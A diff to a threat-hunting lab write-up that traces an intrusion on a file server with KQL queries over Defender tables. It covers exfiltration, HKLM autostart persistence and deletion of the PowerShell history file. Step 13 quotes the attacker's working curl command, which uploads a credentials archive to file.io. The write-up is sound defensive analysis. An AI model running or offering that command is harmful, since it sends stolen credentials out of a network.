@@ -239,7 +239,7 @@ DeviceFileEvents
 
 ---
 
-### 13. Searched the `DeviceFileEvents` Table to find the command used by attacker to exfiltrate the staged data
+### 13. Searched the `DeviceNetworkEvents` Table to find the command used by attacker to exfiltrate the staged data
 
 The attacker used an outbound HTTP request to upload the compressed archive to an external endpoint. This is the command used by the attacker "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io. The cloud service used was “file.io”.
 
@@ -256,6 +256,38 @@ DeviceNetworkEvents
 
 ---
 
+### 14. Searched the `DeviceRegistryEvents` Table to find the registry value name used to establish persistence
+
+The attacker used the HKLM autostart key to affect all users on system start to establish persistence. The attacker named the persistence beacon filename to “svchost.ps1”.
+
+**Query used to locate events:**
+
+```kql
+DeviceRegistryEvents
+| where DeviceName == "azuki-fileserver01"
+| where InitiatingProcessCommandLine contains "HKLM"
+| project TimeGenerated, ActionType, DeviceName, RegistryValueName, InitiatingProcessCommandLine
+```
+<img width="1212" alt="image" src="https://github.com/user-attachments/assets/2a7fe8c1-4e40-4f6e-8c83-ba7a45cac638">
+
+---
+
+### 15. Searched the `DeviceFileEvents` Table to find the powerShell history file deleted
+
+Since the powershell saves the command history to persistent files that survive the session termination, the attacker deleted that file to evade detection.
+
+**Query used to locate events:**
+
+```kql
+DeviceFileEvents
+| where DeviceName == "azuki-fileserver01"
+| where ActionType == "FileDeleted"
+| where FileName contains "history"
+| project TimeGenerated, ActionType, DeviceName, FileName
+```
+<img width="1212" alt="image" src="https://github.com/user-attachments/assets/f5883521-3500-4c0a-9dec-2a502e7d6b3f">
+
+---
 
 ## Chronological Event Timeline 
 
